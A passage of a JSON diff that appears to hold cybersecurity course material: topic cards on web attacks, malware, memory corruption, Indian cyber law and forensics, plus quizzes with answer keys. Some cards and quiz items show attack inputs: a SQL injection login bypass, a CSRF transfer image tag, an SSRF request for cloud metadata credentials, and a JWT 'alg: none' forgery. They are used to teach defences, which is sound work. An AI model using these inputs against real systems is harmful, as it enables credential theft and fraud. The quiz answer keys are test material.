+          "a": "XSS injects and executes malicious code within the victim's browser session on the target site (exploiting the user's trust in the site). CSRF tricks the victim's authenticated browser into sending unauthorized requests to a site (exploiting the site's trust in the user's browser credentials)."
+        },
+        {
+          "id": "cyber_m4_ssrf_attacks",
+          "cat": "Web Vulnerabilities",
+          "title": "SERVER-SIDE REQUEST FORGERY (SSRF)",
+          "sub": "Coercing Backend Servers to Query Internal Microservices and Cloud Metadata",
+          "plain": "In an SSRF attack, the hacker tricks a web server into making network requests on their behalf. The server fetches internal data—like cloud admin keys or internal databases—that the hacker could never access from the outside internet.",
+          "def": "Server-Side Request Forgery (SSRF) is a vulnerability where an attacker manipulates a server application into creating or sending unauthorized HTTP/TCP requests to an unintended destination (often internal-only systems or third-party services). In cloud environments, SSRF is frequently leveraged to query the internal Instance Metadata Service (IMDS at `http://169.254.169.254/`) to steal temporary IAM cloud administrator credentials. Defenses include: strict URL whitelisting, disabling unnecessary URL schemes (e.g., `file://`, `gopher://`), and enforcing IMDSv2 (session-token-based).",
+          "exam": "Target to memorize for exams: The non-routable link-local cloud metadata IP `169.254.169.254`. In AWS, querying `/latest/meta-data/iam/security-credentials/` dumps secret cloud credentials if unprotected.",
+          "trap": "Exam Trap: Relying on DNS hostname blacklisting to prevent SSRF. Attackers bypass hostname filters using DNS Rebinding attacks (where a domain resolves to a public IP first, then dynamically resolves to `127.0.0.1` when the server fetches it).",
+          "example": "A web app provides a 'fetch profile picture from URL' feature. An attacker supplies `http://169.254.169.254/latest/meta-data/identity-credentials`. The backend server fetches and displays the cloud admin credentials.",
+          "q": "How do attackers exploit Server-Side Request Forgery (SSRF) vulnerabilities in public cloud environments (such as AWS), and what is the primary target asset?",
+          "a": "Attackers coerce the cloud web server into querying the non-routable link-local Instance Metadata Service (IMDS) at IP 169.254.169.254 to extract temporary IAM role security credentials, achieving complete cloud infrastructure compromise."
+        },
+        {
+          "id": "cyber_m4_owasp_top_10",
+          "cat": "Application Security",
+          "title": "OWASP TOP 10 WEB APPLICATION SECURITY RISKS",
+          "sub": "Industry Standard Benchmark for Application Vulnerabilities",
+          "plain": "The OWASP Top 10 is the globally recognized list of the most critical security vulnerabilities in web applications. It serves as an essential security checklist for web developers and auditors worldwide.",
+          "def": "The Open Web Application Security Project (OWASP) Top 10 is a foundational awareness document identifying the most critical security risks facing web applications. The standard ranking encompasses: A01: Broken Access Control (unauthorized data access/IDOR); A02: Cryptographic Failures (exposing plaintext, weak ciphers); A03: Injection (SQL, XSS, OS command injection); A04: Insecure Design; A05: Security Misconfiguration; A06: Vulnerable and Outdated Components; A07: Identification and Authentication Failures; A08: Software and Data Integrity Failures; A09: Security Logging and Monitoring Failures; A10: Server-Side Request Forgery (SSRF).",
+          "exam": "Broken Access Control (A01) is the #1 ranked vulnerability in modern OWASP versions. Insecure Direct Object Reference (IDOR) falls directly under Broken Access Control.",
+          "trap": "Exam Trap: Thinking OWASP Top 10 is a regulatory law. It is an industry consensus best practice guideline; however, compliance frameworks like PCI-DSS and ISO 27001 frequently mandate compliance with OWASP guidelines.",
+          "example": "An Insecure Direct Object Reference (IDOR) where changing the URL from `/api/invoice?id=1001` to `id=1002` displays another customer's invoice is an example of OWASP A01: Broken Access Control.",
+          "q": "What is an Insecure Direct Object Reference (IDOR), and under which OWASP Top 10 category does it reside?",
+          "a": "IDOR occurs when an application uses user-supplied input to access database objects directly without verifying authorization (e.g., modifying an account ID in a URL to view another user's data). It resides under A01: Broken Access Control."
+        },
+        {
+          "id": "cyber_m4_auth_session_mgmt",
+          "cat": "Authentication",
+          "title": "AUTHENTICATION, SESSION HIJACKING, AND JWT SECURITY",
+          "sub": "Securing Tokens, Preventing Session Fixation, and Cryptographic Signature Verification",
+          "plain": "Authentication verifies who you are. Once logged in, you get a session ID or JSON Web Token (JWT). If hackers steal this token, they become you. Securing tokens requires proper signing, HTTPS-only transmission, and strict signature verification.",
+          "def": "Authentication verifies the identity of a principal, while Session Management maintains user state across stateless HTTP requests. JSON Web Tokens (JWT, RFC 7519) encode claims in three base64url parts: Header, Payload, and Signature. Vulnerabilities include: Session Hijacking (intercepting session tokens), Session Fixation (forcing a known session ID onto a victim prior to login), and JWT Header Tampering (such as setting `\"alg\": \"none\"` or exploiting algorithm confusion between RSA and HMAC to bypass signature verification).",
+          "exam": "Session Fixation defense: The application MUST regenerate a brand-new session ID immediately upon successful user login. JWT defense: Never trust the `alg` header from the client; enforce explicit server-side algorithm whitelisting.",
+          "trap": "Exam Trap: Assuming the data inside a standard JWT payload is encrypted. JWT tokens are merely Base64URL-encoded, NOT encrypted! Anyone who intercepts the token can decode and read all payload claims in plaintext.",
+          "example": "An attacker modifies a JWT header to `{\"alg\":\"none\"}`, strips the signature, and submits the token. A vulnerable server accepts the token without validating the signature, granting instant administrator privileges.",
+          "q": "Explain the 'alg: none' vulnerability in JSON Web Token (JWT) implementations and how a secure authentication backend prevents it.",
+          "a": "An attacker edits the JWT header to specify `\"alg\": \"none\"` and removes the signature. Vulnerable verification libraries interpret this as requiring no signature check and accept the forged payload. Secure backends prevent this by strictly whitelisting required signing algorithms on the server."
+        },
+        {
+          "id": "cyber_m4_secure_coding_input_validation",
+          "cat": "Secure Coding",
+          "title": "SECURE CODING PRINCIPLES: VALIDATION AND SANITIZATION",
+          "sub": "Input Whitelisting, Context-Aware Encoding, and Fail-Safe Defaults",
+          "plain": "Never trust anything coming from the user. Check all data against strict whitelists (e.g., only letters and numbers allowed). If displaying user data, encode it so the browser treats it as text, never as executable code.",
+          "def": "Secure Coding Principles establish programmatic methodologies to prevent software flaws: 1. Input Validation: Enforcing strict allow-lists (whitelisting) over block-lists (blacklisting), validating data type, syntax, length, and range before processing. 2. Output Encoding: Context-aware encoding (HTML, JavaScript, CSS, URL encoding) transforming dangerous characters into benign representations before rendering. 3. Fail-Safe Defaults: Ensuring systems fail into a closed, secure state upon encountering exceptions or errors.",
+          "exam": "Golden rule: Validate input on ARRIVAL (whitelist validation); encode output on DEPARTURE (context-aware output encoding). Always perform validation on the SERVER side; client-side validation is easily bypassed.",
+          "trap": "Exam Trap: Relying on client-side HTML5/JavaScript validation (`required`, regex patterns). An attacker bypasses client validation effortlessly using curl, Postman, or Burp Suite proxy.",
+          "example": "A web form validates that a phone number matches `^[0-9]{10}$` on the server before processing; any payload containing quotes or angle brackets is rejected immediately with an error.",
+          "q": "Why is client-side input validation completely insufficient for web application security, and how must server-side validation be implemented?",
+          "a": "Client-side validation can be completely bypassed by disabling JavaScript or submitting HTTP requests directly via tools like Burp Suite or curl. Server-side validation must be implemented using strict allow-lists (whitelisting) checking data type, format, length, and character sets."
+        },
+        {
+          "id": "cyber_m4_malware_taxonomy",
+          "cat": "Malware",
+          "title": "MALWARE TAXONOMY: VIRUSES, WORMS, TROJANS, ROOTKITS",
+          "sub": "Classification of Malicious Software by Propagation and Infection Mechanism",
+          "plain": "Viruses need a human host file to latch onto and run. Worms are standalone programs that replicate across networks automatically without human help. Trojans disguise themselves as useful software. Rootkits hide deep inside the OS kernel to remain invisible.",
+          "def": "Malware (Malicious Software) is categorized by propagation strategy, payload delivery, and operational concealment: 1. Computer Virus: Malicious code that attaches itself to legitimate executable host programs and requires user execution to propagate. 2. Computer Worm: Standalone, self-replicating program that exploits network vulnerabilities to spread autonomously without human intervention. 3. Trojan Horse: Program that masquerades as legitimate, useful software while surreptitiously executing unauthorized malicious payloads. 4. Rootkit: Collection of stealth software designed to maintain privileged root/kernel-level access while actively concealing processes, files, and network sockets from the operating system.",
+          "exam": "Key distinction for ASTU exams: Virus REQUIRES a host program and user execution. Worm is STANDALONE and self-propagating across networks (e.g., WannaCry, Conficker). Rootkits operate at Ring 0 (Kernel Mode) to hook system calls.",
+          "trap": "Exam Trap: Calling WannaCry a virus. WannaCry used the EternalBlue SMB network exploit to spread automatically without user action, making its propagation engine a Worm.",
+          "example": "Stuxnet worm spread autonomously across Windows LANs via zero-day vulnerabilities, while installing a kernel rootkit to hide its presence and sabotage Iranian nuclear centrifuges.",
+          "q": "Differentiate between a Computer Virus and a Computer Worm based on host dependency and propagation mechanism.",
+          "a": "A Computer Virus requires a host executable file and human intervention (user execution) to activate and replicate. A Computer Worm is a standalone program that replicates autonomously across computer networks by exploiting system vulnerabilities without human intervention."
+        },
+        {
+          "id": "cyber_m4_ransomware_mechanics",
+          "cat": "Malware",
+          "title": "RANSOMWARE MECHANICS AND INCIDENT MITIGATION",
+          "sub": "Cryptovirology, Double Extortion, and Defense Against Data Hostage Scenarios",
+          "plain": "Ransomware is malware that silently encrypts all your files with military-grade cryptography and demands money for the key. Double extortion ransomware also steals your data first and threatens to publish it publicly if you don't pay.",
+          "def": "Ransomware is malicious software employing cryptovirology to deny access to user data or system resources until a ransom is paid. Modern ransomware follows a multi-stage lifecycle: 1. Initial Access (phishing, RDP brute force). 2. Lateral Movement & Privilege Escalation. 3. Data Exfiltration (Double Extortion: threatening public leak). 4. In-place Hybrid Encryption (encrypting local files with symmetric AES/ChaCha20 keys, then encrypting the symmetric keys with the attacker's public RSA/ECC key). Mitigations include: immutable offsite backups (3-2-1 backup strategy), network segmentation, and endpoint behavioral EDR.",
+          "exam": "Why can't encrypted files be decrypted without the attacker's key? Because attackers use hybrid encryption: AES-256 for high-speed file encryption, and the attacker's public RSA key to encrypt the AES key. The private decryption key never touches the victim's machine!",
+          "trap": "Exam Trap: Relying solely on continuous cloud sync (like OneDrive/Dropbox) as a ransomware backup. The synced cloud folder will instantly synchronize the newly encrypted files, destroying the backup unless immutable versioning is enabled.",
+          "example": "The Colonial Pipeline ransomware attack paralyzed major fuel pipeline operations across the US East Coast after attackers entered through an inactive VPN account lacking multi-factor authentication.",
+          "q": "How does modern ransomware implement hybrid encryption to securely encrypt victim files while ensuring the decryption key cannot be extracted from the victim's computer?",
+          "a": "Ransomware generates a local symmetric key (AES) to encrypt files quickly, then encrypts that symmetric key using the attacker's master public key (RSA). The private decryption key remains exclusively on the attacker's server, making local key extraction mathematically impossible."
+        },
+        {
+          "id": "cyber_m4_buffer_overflow",
+          "cat": "System Security",
+          "title": "BUFFER OVERFLOW AND MEMORY CORRUPTION DEFENSES",
+          "sub": "Stack Smashing, Instruction Pointer Overwrite, DEP/NX, and ASLR",
+          "plain": "A buffer overflow occurs when a program puts more data into a memory container than it can hold, spilling over into neighboring memory. Attackers use this to overwrite the return address and take complete control of the CPU.",
+          "def": "A Buffer Overflow occurs when a process attempts to store data beyond the allocated boundaries of a fixed-length buffer in memory (typically in languages like C/C++ lacking automated bounds checking). In a Stack-Based Buffer Overflow ('stack smashing'), input overflows past local variables to overwrite the Saved Frame Pointer (SFP) and Extended Instruction Pointer (EIP/RIP) on the call stack, redirecting execution to injected shellcode. Modern OS Mitigations: 1. Non-Executable Stack (DEP/NX bit). 2. Address Space Layout Randomization (ASLR). 3. Compiler Stack Canaries (`-fstack-protector`).",
+          "exam": "Unsafe C functions: `strcpy()`, `gets()`, `sprintf()`, `strcat()`. Safe replacements: `strncpy()`, `fgets()`, `snprintf()`. Memory protections: NX/DEP prevents shellcode execution on stack; ASLR randomizes stack/heap base addresses.",
+          "trap": "Exam Trap: Believing ASLR alone stops buffer overflows. ASLR randomizes memory layout, making jumps harder; however, attackers bypass it using Return-Oriented Programming (ROP) or information disclosure memory leaks.",
+          "example": "Overwriting a 64-byte buffer with 128 bytes containing 72 bytes of junk followed by the address of a malicious function hijacks the program execution flow.",
+          "q": "What is the function of a compiler Stack Canary (Stack Guard), and how does it detect buffer overflow attacks before shellcode executes?",
+          "a": "A Stack Canary is a random integer placed on the stack immediately before the saved return address. Before a function returns, the compiler checks whether the canary value was altered; if an overflow changed it, the program terminates immediately."
+        },
+        {
+          "id": "cyber_m4_penetration_testing_phases",
+          "cat": "Security Assessment",
+          "title": "PENETRATION TESTING METHODOLOGY AND PHASES",
+          "sub": "Standardized Ethical Hacking Lifecycle (PTES and NIST SP 800-115)",
+          "plain": "Penetration testing is authorized legal hacking. Ethical hackers simulate real-world attacks to find security holes before real adversaries do. It follows strict phases: Reconnaissance, Scanning, Exploitation, Post-Exploitation, and Reporting.",
+          "def": "Penetration Testing (Ethical Hacking) is the authorized, systematic process of probing and exploiting vulnerabilities in target applications, networks, or systems to evaluate actual security posture. Standard 5 Phases (PTES): 1. Reconnaissance (OSINT, passive/active footprinting). 2. Scanning & Enumeration (port scanning with Nmap, vulnerability scanning with Nessus). 3. Exploitation (gaining an initial foothold via validated vulnerabilities). 4. Post-Exploitation (privilege escalation, lateral movement, data extraction). 5. Reporting (detailed remediation roadmap and executive risk summary).",
+          "exam": "Vulnerability Assessment vs Penetration Testing: Vulnerability Assessment identifies and catalogs potential flaws without actively exploiting them. Penetration Testing actively exploits vulnerabilities to demonstrate actual risk and impact.",
+          "trap": "Exam Trap: Conducting penetration testing without signed Rules of Engagement (RoE). Testing without formal written authorization is illegal hacking under Section 66 of the IT Act 2000, regardless of ethical intent!",
+          "example": "An ethical hacking team discovers an unauthenticated API in an online store during the Scanning phase, exploits it to gain database access, and submits a vulnerability remediation report to management.",
+          "q": "Differentiate between a Vulnerability Assessment and a Penetration Test in enterprise security auditing.",
+          "a": "A Vulnerability Assessment is a non-intrusive scan that identifies and lists potential known vulnerabilities without exploiting them. A Penetration Test actively exploits vulnerabilities to validate their exploitability and demonstrate real-world organizational impact."
+        }
+      ],
+      "quiz": [
+        {
+          "q": "In an authentication bypass attack, an attacker inputs the string \"admin' --\" into a login username field. Why does this input bypass password verification on a poorly written backend?",
+          "opts": [
+            "The double dash comments out the remainder of the SQL query, eliminating the password check clause",
+            "It triggers a buffer overflow in the web server's memory heap",
+            "It executes an automated cross-site scripting payload inside the database",
+            "It forces the database engine to reboot into maintenance mode"
+          ],
+          "ans": 0,
+          "cat": "Web Vulnerabilities",
+          "correctFb": "In standard SQL syntax, '--' designates an inline comment. Injecting \"admin' --\" causes the database engine to parse the query as: SELECT * FROM users WHERE username = 'admin' -- AND password = '...', completely ignoring the password check.",
+          "distractors": [
+            "SQL injection is an application-level syntax manipulation flaw, not a memory buffer overflow.",
+            "SQL injection targets relational database parsers, whereas XSS targets client-side web browser JavaScript engines.",
+            "SQL syntax errors do not reboot database engines into maintenance mode."
+          ]
+        },
+        {
+          "q": "Which of the following defenses is considered the gold standard for completely preventing SQL Injection vulnerabilities across modern application architectures?",
+          "opts": [
+            "Filtering out single quote characters using client-side JavaScript regex",
+            "Employing Parameterized Queries with Prepared Statements",
+            "Deploying a web application firewall while maintaining dynamic string concatenation in queries",
+            "Restricting database access strictly to users on mobile devices"
+          ],
+          "ans": 1,
+          "cat": "Web Vulnerabilities",
+          "correctFb": "Parameterized Queries (Prepared Statements) ensure that the database engine parses and compiles the SQL query structure before binding user input. User data is strictly treated as literal values, rendering SQL injection impossible.",
+          "distractors": [
+            "Client-side regex filters are effortlessly bypassed by submitting requests directly via curl or intercepting proxies.",
+            "WAFs provide temporary perimeter filtering but fail against obfuscated or novel injection encodings.",
+            "Mobile user access does not prevent backend SQL query string manipulation."
+          ]
+        },
+        {
+          "q": "What security header or cookie attribute prevents client-side JavaScript from accessing session cookies via 'document.cookie', neutralizing cookie theft via XSS?",
+          "opts": [
+            "SameSite=Strict",
+            "HttpOnly",
+            "Secure",
+            "X-Frame-Options: DENY"
+          ],
+          "ans": 1,
+          "cat": "Web Vulnerabilities",
+          "correctFb": "The HttpOnly flag instructs the web browser that the cookie should not be accessible through client-side scripts (such as document.cookie), preventing attackers from directly exfiltrating session tokens via XSS.",
+          "distractors": [
+            "SameSite controls whether cookies are sent on cross-origin requests to prevent CSRF.",
+            "Secure ensures cookies are only transmitted across encrypted HTTPS connections.",
+            "X-Frame-Options prevents clickjacking by restricting page embedding in iframes."
+          ]
+        },
+        {
+          "q": "An attacker places an invisible 1x1 image on an external forum: <img src='http://bank.com/transfer?to=attacker&amount=5000'>. When a logged-in banking user visits the forum, money is transferred. What attack occurred?",
+          "opts": [
+            "Cross-Site Request Forgery (CSRF)",
+            "Stored Cross-Site Scripting (XSS)",
+            "Server-Side Request Forgery (SSRF)",
+            "SQL Injection"
+          ],
+          "ans": 0,
+          "cat": "Web Vulnerabilities",
+          "correctFb": "This is Cross-Site Request Forgery (CSRF). The victim's browser automatically appends ambient authentication credentials (session cookies) to the cross-origin request destined for bank.com, executing the action without user consent.",
+          "distractors": [
+            "No JavaScript was executed within the context of bank.com, ruling out XSS.",
+            "The request was initiated by the client's browser, not coerced from a backend server (ruling out SSRF).",
+            "The attack abused application state transfer, not relational database SQL syntax."
+          ]
+        },
+        {
+          "q": "In a cloud deployment, an attacker exploits an SSRF vulnerability to coerce a backend web server to query 'http://169.254.169.254/latest/meta-data/'. What is the attacker attempting to steal?",
+          "opts": [
+            "The local router's default Wi-Fi password",
+            "Temporary cloud IAM role security credentials and metadata",
+            "The client's browser bookmarks",
+            "The physical server rack's serial number"
+          ],
+          "ans": 1,
+          "cat": "Web Vulnerabilities",
+          "correctFb": "169.254.169.254 is the well-known link-local IP for cloud Instance Metadata Services (IMDS). Attackers leverage SSRF to query this endpoint and extract temporary IAM role keys to take over cloud infrastructure.",
+          "distractors": [
+            "Wi-Fi passwords are not stored in cloud virtual machine metadata endpoints.",
+            "Client browser bookmarks reside on end-user laptops, not on remote cloud backend servers.",
+            "Cloud virtual instances do not expose physical server rack hardware serials."
+          ]
+        },
+        {
+          "q": "An attacker intercepts a JSON Web Token (JWT) and alters the header to specify '\"alg\": \"none\"', removes the signature portion, and submits it to a vulnerable web server. What occurs?",
+          "opts": [
+            "The token is permanently erased from the client device",
+            "The vulnerable server accepts the forged token without validating any cryptographic signature",
+            "The server automatically issues an asymmetric RSA challenge to the client",
+            "The database drops all active user tables"
+          ],
+          "ans": 1,
+          "cat": "Authentication",
+          "correctFb": "In the classic 'alg: none' vulnerability, flawed JWT verification libraries treat the token as an unsigned token, bypassing cryptographic signature validation and accepting forged administrative claims.",
+          "distractors": [
+            "JWT verification does not erase tokens from client storage.",
+            "Servers do not dynamically initiate client-side RSA challenges when processing bearer tokens.",
+            "JWT validation errors do not execute database drop table commands."
+          ]
+        },
+        {
+          "q": "What fundamental characteristic distinguishes a computer worm from a computer virus?",
+          "opts": [
+            "A worm requires an infected host program file to replicate, whereas a virus is standalone",
+            "A worm is a standalone program that self-propagates across computer networks without requiring human intervention or a host file",
+            "A virus is always written in Python, while a worm is written in Assembly",
+            "A worm cannot infect systems running Microsoft Windows"
+          ],
+          "ans": 1,
+          "cat": "Malware",
+          "correctFb": "A computer worm is a standalone, self-replicating program that spreads across network connections autonomously by exploiting vulnerabilities, whereas a virus requires a host executable file and user execution.",
+          "distractors": [
+            "This reverses the definitions: viruses require a host file, whereas worms are standalone.",
+            "Malware can be written in virtually any programming language.",
+            "Worms frequently target Windows systems (e.g., Code Red, Conficker, WannaCry)."
+          ]
+        },
+        {
+          "q": "What operating system defense mechanism randomizes the memory addresses of the stack, heap, and loaded libraries to make buffer overflow exploitation unpredictable?",
+          "opts": [
+            "Data Execution Prevention (DEP / NX)",
+            "Address Space Layout Randomization (ASLR)",
+            "Compiler Stack Canaries",
+            "Static Code Analysis"
+          ],
+          "ans": 1,
+          "cat": "System Security",
+          "correctFb": "Address Space Layout Randomization (ASLR) randomly arranges the address space positions of key data areas (stack, heap, shared libraries) in a process, preventing an attacker from reliably jumping to predictable memory addresses.",
+          "distractors": [
+            "DEP/NX marks memory pages (like the stack) as non-executable to prevent injected code execution.",
+            "Stack Canaries place a secret sentinel value on the stack to detect return address overwrites.",
+            "Static analysis is a source-code review methodology, not an active operating system runtime defense."
+          ]
+        },
+        {
+          "q": "Which of the following unsafe C standard library functions is notorious for causing stack-based buffer overflows because it copies strings without checking destination buffer boundaries?",
+          "opts": [
+            "fgets()",
+            "strcpy()",
+            "strncpy()",
+            "snprintf()"
+          ],
+          "ans": 1,
+          "cat": "System Security",
+          "correctFb": "The strcpy() function copies characters until it encounters a null terminator, without performing any boundary checks on the destination buffer. If the source string exceeds the destination array size, it overflows the stack.",
+          "distractors": [
+            "fgets() requires specifying a maximum character length, making it safe against buffer overflows.",
+            "strncpy() accepts an explicit byte limit parameter.",
+            "snprintf() enforces an explicit buffer size argument."
+          ]
+        },
+        {
+          "q": "What is the critical first phase of a standardized penetration testing methodology, where testers gather intelligence on domain names, network ranges, and employees without actively attacking?",
+          "opts": [
+            "Exploitation",
+            "Reconnaissance (Footprinting / OSINT)",
+            "Privilege Escalation",
+            "Post-Exploitation Cleanup"
+          ],
+          "ans": 1,
+          "cat": "Security Assessment",
+          "correctFb": "Reconnaissance (Information Gathering / Footprinting) is the initial phase where testers collect Open-Source Intelligence (OSINT), discover network ranges, examine DNS records, and profile target infrastructure prior to scanning.",
+          "distractors": [
+            "Exploitation is the active phase where identified vulnerabilities are weaponized to breach systems.",
+            "Privilege escalation occurs after gaining an initial foothold to obtain administrative access.",
+            "Post-exploitation cleanup is the final operational phase where backdoors and test artifacts are removed."
+          ]
+        }
+      ],
+      "bossChallenges": [
+        {
+          "marks": 10,
+          "scenario": "A financial technology startup launches an online lending application. During a third-party security audit, multiple high-severity web vulnerabilities are identified: a customer profile page vulnerable to Stored XSS, a loan disbursement endpoint susceptible to CSRF, and an administrative search function vulnerable to SQL injection. Prepare an executive and technical remediation report: analyze the operational mechanics of each vulnerability, provide vulnerable code versus hardened code implementations, and design an application security architecture incorporating Content Security Policy (CSP), Anti-CSRF tokens, and Parameterized Queries.",
+          "rubric": [
+            "Exploitation Mechanics Breakdown (2.5 marks): Clear technical explanation of how each vulnerability operates at the browser and database layers.",
+            "Code-Level Remediation (2.5 marks): Demonstrating vulnerable code alongside drop-in refactored code utilizing Prepared Statements, context-aware output encoding, and Anti-CSRF tokens.",
+            "Architectural Hardening (2.5 marks): Implementing Content Security Policy (CSP) headers, SameSite=Strict cookies, and Least-Privilege database user permissions.",
+            "Operational Verification & Testing (2.5 marks): Prescribing automated DAST/SAST testing integration into the CI/CD pipeline and conducting regular penetration tests."
+          ]
+        },
+        {
+          "marks": 5,
+          "scenario": "A legacy C-based network daemon running on an enterprise Linux server crashes when receiving excessively long incoming user requests. Memory dump analysis reveals that the Saved Frame Pointer and Return Address were overwritten by user input. Explain how this stack buffer overflow occurred, analyze the CPU execution hijacking mechanism, and formulate three modern operating system and compiler defenses that neutralize such attacks.",
+          "rubric": [
+            "Buffer Overflow Mechanics (1.25 marks): Detailed explanation of unchecked buffer boundaries (`strcpy`/`gets`) corrupting the call stack frame.",
+            "Instruction Pointer Hijacking (1.25 marks): Explaining how the EIP/RIP register is hijacked to redirect CPU execution flow to attacker shellcode.",
+            "OS & Compiler Mitigations (1.25 marks): Explaining the operational mechanisms of Data Execution Prevention (DEP/NX), Address Space Layout Randomization (ASLR), and Stack Canaries.",
+            "Safe Code Refactoring (1.25 marks): Replacing unbounded string functions with bounded alternatives (`strncpy`, `fgets`, `snprintf`)."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m5",
+      "num": 5,
+      "title": "Cyber Laws and Emerging Trends",
+      "topics": [
+        {
+          "id": "cyber_m5_it_act_2000_overview",
+          "cat": "Cyber Law",
+          "title": "INFORMATION TECHNOLOGY ACT 2000: OBJECTIVES AND SCOPE",
+          "sub": "Legal Recognition of Electronic Records, Digital Signatures, and Extraterritorial Jurisdiction",
+          "plain": "The IT Act 2000 is India's mother cyber law. It gave legal status to electronic documents and digital signatures so you can sign contracts online. It also applies to crimes committed outside India if they target computers inside India.",
+          "def": "The Information Technology Act 2000 (ITA-2000), enacted based on the UNCITRAL Model Law on Electronic Commerce, provides legal recognition for electronic transactions, digital signatures, and electronic records in India. Under Section 75, the Act possesses Extraterritorial Jurisdiction: it applies to any offence or contravention committed outside India by any person, regardless of nationality, if the act involves a computer, computer system, or computer network located in India.",
+          "exam": "Key highlights for ASTU exams: Enacted on 9 June 2000 (notified 17 Oct 2000). Section 75 provides extraterritorial reach (crimes committed outside India against Indian systems). Major amendment in 2008 added Sections 66A-66F.",
+          "trap": "Exam Trap: Believing the IT Act only applies to Indian citizens. False! Section 75 explicitly states it applies to ANY person of ANY nationality located anywhere globally, provided the targeted computer resource is in India.",
+          "example": "A cybercriminal based in Eastern Europe hacks a server located in Guwahati, Assam. Indian law enforcement has legal jurisdiction to prosecute under Section 75 of the IT Act 2000.",
+          "q": "Explain the extraterritorial jurisdiction of India's Information Technology Act 2000 under Section 75.",
+          "a": "Section 75 states that the IT Act applies to any offense or contravention committed outside India by any person, irrespective of their nationality, provided the act involves a computer, computer system, or network located within India."
+        },
+        {
+          "id": "cyber_m5_it_act_section_43_65",
+          "cat": "Cyber Law",
+          "title": "IT ACT SECTIONS 43 AND 65: DAMAGE AND SOURCE CODE TAMPERING",
+          "sub": "Civil Penalties for System Damage and Criminal Liability for Source Document Alteration",
+          "plain": "Section 43 makes you pay heavy financial compensation if you damage, download, or introduce viruses into someone's computer without permission. Section 65 puts you in prison for up to 3 years if you tamper with computer source code.",
+          "def": "The IT Act 2000 establishes distinct civil and criminal liabilities: Section 43 imposes civil liability and monetary compensation (payable to the victim) for unauthorized access, data extraction, downloading, introducing computer contaminants/viruses, causing denial of service, or damaging computer systems. Section 65 makes it a cognizable criminal offense to knowingly or intentionally conceal, destroy, or alter computer source code required to be maintained by law, punishable by imprisonment up to 3 years and/or fine up to ₹2,00,000.",
+          "exam": "Section 43 = Civil compensation (damages payable to the affected victim). Section 65 = Criminal penalty for tampering with computer source code (up to 3 years imprisonment + fine).",
+          "trap": "Exam Trap: Confusing Section 43 (Civil penalty / compensation without prison) with Section 66 (Criminal hacking with imprisonment). If the act is done 'dishonestly or fraudulently,' Section 43 acts transition into Section 66 criminal offenses!",
+          "example": "An employee downloads sensitive corporate source code and client lists before resigning. The company sues for financial damages under Section 43 and files criminal charges under Section 65 and 66.",
+          "q": "What is the primary legal distinction between Section 43 and Section 65 of India's Information Technology Act 2000?",
+          "a": "Section 43 deals with civil liability, awarding monetary compensation to victims for unauthorized system access, data theft, and virus injection. Section 65 is a criminal offense penalizing the intentional tampering, concealment, or destruction of computer source code with up to 3 years imprisonment."
+        },
+        {
+          "id": "cyber_m5_it_act_section_66_subsections",
+          "cat": "Cyber Law",
+          "title": "IT ACT SECTION 66 AND SUBSECTIONS: 66B TO 66F",
+          "sub": "Criminal Offences: Hacking, Identity Theft, Privacy Violation, and Cyber Terrorism",
+          "plain": "Section 66 punishes hacking with up to 3 years in jail. Its sub-sections cover stolen computer property (66B), identity theft (66C), cheating by impersonation (66D), privacy violations like taking private photos without consent (66E), and cyber terrorism (66F), which carries life imprisonment.",
+          "def": "Section 66 of the IT Act criminalizes acts listed in Section 43 committed dishonestly or fraudulently (up to 3 years imprisonment or fine up to ₹5 lakh). The 2008 Amendment introduced specific sub-sections: 66B (dishonestly receiving stolen computer resource); 66C (identity theft, stealing passwords/digital signatures; up to 3 years); 66D (cheating by personation using computer; up to 3 years); 66E (violating privacy by capturing/publishing private images without consent; up to 3 years); 66F (Cyber Terrorism—threatening the unity, integrity, security, or sovereignty of India; punishable by imprisonment for LIFE).",
+          "exam": "Critical exam fact: Cyber Terrorism (Section 66F) carries LIFE IMPRISONMENT—the harshest penalty under the IT Act! Section 66C covers password theft; Section 66D covers phishing/impersonation.",
+          "trap": "Exam Trap: Citing Section 66A. Section 66A (offensive messages) was struck down as UNCONSTITUTIONAL by the Supreme Court of India in the landmark Shreya Singhal v. Union of India (2015) judgment!",
+          "example": "A hacker breaches an Indian power grid control network to disrupt electricity across multiple states. They are prosecuted under Section 66F for Cyber Terrorism, facing potential life imprisonment.",
+          "q": "Under the Indian IT Act, which section penalizes Cyber Terrorism, and what is the maximum statutory punishment prescribed?",
+          "a": "Section 66F penalizes Cyber Terrorism. The maximum statutory punishment prescribed is imprisonment for life."
+        },
+        {
+          "id": "cyber_m5_digital_forensics_lifecycle",
+          "cat": "Digital Forensics",
+          "title": "DIGITAL FORENSICS INVESTIGATION LIFECYCLE",
+          "sub": "Identification, Preservation, Collection, Examination, Analysis, and Reporting",
+          "plain": "Digital forensics is the science of uncovering evidence from digital devices for a court of law. It follows a strict process: identify the devices, preserve the data without altering a single bit, collect it with write-blockers, examine and analyze it, and present a clear report in court.",
+          "def": "Digital Forensics is the scientific identification, preservation, examination, analysis, and presentation of digital evidence stored on electronic devices in a manner admissible in a court of law. Standard ISO/IEC 27037 Lifecycle: 1. Identification (locating potential evidence sources, assessing scene). 2. Preservation (isolating devices from networks, bagging in Faraday cages). 3. Collection / Acquisition (bit-stream disk cloning using write blockers, volatile RAM capture). 4. Examination & Analysis (extracting deleted files, timeline analysis, correlation). 5. Reporting (presenting expert findings compliant with legal evidentiary standards).",
+          "exam": "Order of Volatility (RFC 3227): When collecting evidence, always capture the most volatile data first: 1. Registers and CPU cache. 2. Routing tables, ARP cache, process table, kernel memory (RAM). 3. Temporary file systems. 4. Disk storage. 5. Remote logging/monitoring. 6. Physical topology and backups.",
+          "trap": "Exam Trap: Turning off a computer by pulling the power plug during an active attack. Pulling the plug instantly destroys volatile RAM data (encryption keys, active connections, running processes). Always capture live RAM first before powering down!",
+          "example": "Forensic investigators isolate a suspect's laptop in a Faraday bag, use a hardware write-blocker to image the SSD to a raw `.E01` file, verify matching SHA-256 hashes, and recover deleted criminal email drafts.",
+          "q": "Why must a digital forensics investigator capture volatile RAM memory before shutting down or unplugging a compromised computer?",
+          "a": "RAM is highly volatile and loses its contents when power is lost. RAM contains critical ephemeral evidence including running processes, decrypted memory keys, active network sockets, injected malware shellcode, and unencrypted chat logs that are not saved to disk."
+        },
+        {
+          "id": "cyber_m5_chain_of_custody",
+          "cat": "Digital Forensics",
+          "title": "CHAIN OF CUSTODY AND SECTION 65B EVIDENCE ADMISSIBILITY",
